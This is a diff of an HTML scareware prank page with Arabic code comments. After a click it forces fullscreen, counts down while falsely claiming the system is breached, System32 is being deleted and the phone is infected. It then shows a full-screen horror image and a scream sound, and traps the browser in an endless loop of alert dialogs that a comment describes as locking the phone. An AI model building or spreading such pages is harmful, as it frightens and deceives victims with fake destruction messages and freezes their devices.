@@ -3,32 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM_CRITICAL_ERROR</title>
+    <title>FATAL_ERROR_V3</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: 'Courier New', monospace; }
-        #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #ff0000; box-sizing: border-box; display: flex; flex-direction: column; justify-content: center; background: radial-gradient(circle, #100 0%, #000 100%); text-align: center; }
-        #countdown { font-size: 80px; color: #fff; text-shadow: 0 0 30px #ff0000; margin: 20px 0; }
-        .glitch { font-size: 18px; animation: flash 0.1s infinite; }
-        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        
-        /* الصورة المرعبة بملء الشاشة */
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: monospace; }
+        #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #f00; text-align: center; display: flex; flex-direction: column; justify-content: center; }
+        #countdown { font-size: 80px; color: #fff; text-shadow: 0 0 20px #f00; }
         #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
     </style>
 </head>
 <body onclick="startVirus()">
 
     <div id="terminal">
-        <div class="glitch">⚠️ UNAUTHORIZED ACCESS DETECTED ⚠️</div>
+        <div style="font-size: 20px; animation: blink 0.1s infinite;">⚠️ SYSTEM BREACHED ⚠️</div>
         <div id="countdown">30</div>
-        <div style="color: #0ff; font-size: 12px;">
-            > KERNEL_WIPEOUT: INITIATED...<br>
-            > STATUS: PERMANENT_BRICKING_STARTED
-        </div>
+        <div style="color: #0ff;">> DELETING_SYSTEM_32...<br>> STATUS: INFECTED_BY_FOUKA</div>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     
-    <audio id="screamSfx" src="tfy-krk.mp3" preload="auto"></audio>
+    <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>
 
     <script>
         let seconds = 30;
@@ -37,8 +30,6 @@
         function startVirus() {
             if (active) return;
             active = true;
-
-            // تفعيل ملء الشاشة
             document.documentElement.requestFullscreen().catch(() => {});
 
             let timer = setInterval(() => {
@@ -52,16 +43,15 @@
         }
 
         function triggerScare() {
-            // تشغيل الصوت وإظهار الصورة
             document.getElementById('terminal').style.display = 'none';
             document.getElementById('horrorImg').style.display = 'block';
-            document.getElementById('screamSfx').play();
+            document.getElementById('sfx').play(); // يخدم سواسوة مع الملف المرفوع
 
-            // قفل الهاتف بالرسائل اللانهائية
+            // ميزة اللاق والتبلوكا النهائية
             setTimeout(() => {
                 while(true) {
-                    alert("⚠️ خطأ قاتل: تم تدمير ملفات النظام الأساسية.");
-                    alert("FATAL_ERROR: YOUR_PHONE_IS_GONE");
+                    alert("⚠️ خطأ قاتل! تم تدمير ملفات الـ Boot.");
+                    alert("FATAL_ERROR: PHONE_DYING...");
                 }
             }, 100);
         }
